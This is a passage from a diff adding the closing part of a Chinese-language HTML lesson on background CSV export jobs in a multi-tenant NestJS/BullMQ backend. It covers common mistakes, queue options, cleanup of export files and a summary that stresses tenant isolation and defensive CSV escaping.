+  <li><strong>關機不會弄丟工作</strong>：匯出跑到一半按 Ctrl-C（SIGTERM），重新啟動後那筆最後是 <code>done</code>。</li>
+  <li><strong>已知限制寫下來了</strong>：「commit 之後放進佇列失敗，紀錄會停在 queued」與你的收拾方法，寫在 ADR 或 README。</li>
+</ul>
+
+<h2>常見錯誤</h2>
+<ul>
+  <li><strong>worker 用擁有者連線或 BYPASSRLS 的角色，自己加 where</strong>：兩道防線都關了，漏一個條件就匯出所有租戶。用 job 的 tenantId <code>ctx.run</code>，走 TenantDb。</li>
+  <li><strong><code>ctx.run(c, () =&gt; db.x.findMany())</code></strong>：PrismaPromise 在 run 外面才執行，讀不到上下文。傳 async 函式，在裡面 await。</li>
+  <li><strong>job 的 tenantId 取自請求的 body</strong>：使用者可以替別的租戶排工作。只從 <code>RequestContext</code>（token）拿。</li>
+  <li><strong>用 BullMQ 的 job 狀態回答 <code>GET /exports/:id</code></strong>：完成就被刪掉、沒有租戶隔離。狀態存在有 tenant_id 的資料表。</li>
+  <li><strong>CSV 用 <code>join(',')</code> 直接接</strong>：逗號、換行讓整列錯位；公式開頭的值會在試算表裡執行。每格經過 <code>cell()</code>。</li>
+  <li><strong>失敗時狀態停在 running</strong>：使用者永遠等不到結果。catch 裡寫 <code>failed</code>，再把錯誤丟回去讓 BullMQ 重試。</li>
+</ul>
+
+<h2>補充與查表</h2>
+<ul>
+  <li><strong>這課用到的 <code>queue.add</code> 選項</strong>（查表用，不用背；詳細見 <a href="../../nestjs/lessons/20-queues-bullmq.html">NestJS 課第 20 課</a>）：
+    <div class="table-wrap"><table>
+      <thead><tr><th>選項</th><th>這課的值</th><th>作用</th></tr></thead>
+      <tbody>
+        <tr><td><code>jobId</code></td><td>匯出的 id</td><td>同一個 id 的 job 還在 Redis 時，再放一次會被忽略；job 被移除後就不再擋</td></tr>
+        <tr><td><code>attempts</code></td><td><code>3</code></td><td><code>process</code> 丟錯時最多跑 3 次</td></tr>
+        <tr><td><code>backoff</code></td><td><code>{ type: 'exponential', delay: 1000 }</code></td><td>重試之間的等待，從 1000 ms 開始指數拉長</td></tr>
+        <tr><td><code>removeOnComplete</code></td><td><code>true</code></td><td>完成的 job 從 Redis 刪掉</td></tr>
+        <tr><td><code>removeOnFail</code></td><td><code>100</code></td><td>只留最近 100 個失敗的 job 供查看</td></tr>
+      </tbody>
+    </table></div>
+  </li>
+  <li><strong>匯出檔的儲存與清理</strong>：結果檔存在 <code>tenants/&lt;tenantId&gt;/exports/</code>。參考實作沒有把匯出檔算進方案的容量（第 14 課），因為它可以重新產生；換來的代價是要清理舊檔，可以在儲存設定生命週期規則（例如 7 天後刪除）。</li>
+</ul>
+
+<h2>小結</h2>
+<ul>
+  <li>要很久、使用者不必盯著等的工作交給背景：API 建紀錄、放佇列、回 202；狀態以有 tenant_id 的資料表為準，前端輪詢，沒好之前下載回 409（第 1–2 節）。</li>
+  <li>job 只帶 ID 與上下文（<code>exportId</code>、<code>tenantId</code>、<code>userId</code>、<code>requestId</code>），tenantId 來自 token，不來自 body（第 2 節）。</li>
+  <li>worker 裡沒有請求：<code>ctx.run</code> 用 job 的 tenantId 重建上下文，extension 與 RLS 照常；不用看得到所有租戶的系統身分。忘了開上下文時 fail closed（第 3 節）。</li>
+  <li>至少執行一次，所以冪等：完成的跳過、整份重新產生覆蓋同一個 key、失敗寫 <code>failed</code> 再丟錯讓它重試。commit 後放進佇列失敗的殘局要有排程收拾（第 4 節）。</li>
+  <li>CSV 要跳脫（逗號、雙引號、換行），並在 <code>= + - @</code> 開頭的值前面加 <code>'</code>（第 5 節）。</li>
+  <li>worker 先跟 API 同一個程序；匯出影響 API 延遲時拆開，寫在 ADR 0005；優雅關機加上冪等，部署時不會弄丟工作（第 6 節）。</li>
+</ul>
+<p>下一課是 B2 的最後一課：方案與用量上限（同時建立第 3、第 4 個 project 時怎麼不超過）、每個租戶的限流，這兩件事讓一個租戶不會拖垮其他租戶。</p>
+
+</main>
+<script type="module" src="../lab.js"></script>
+</body>
+</html>
